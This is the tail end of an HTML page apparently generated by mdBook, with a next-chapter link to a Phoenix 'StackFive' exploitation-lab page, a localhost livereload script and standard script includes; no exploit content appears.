                    </a>
                

                
                    <a rel="next" href="../phoenix/StackFive.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3000/__livereload");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
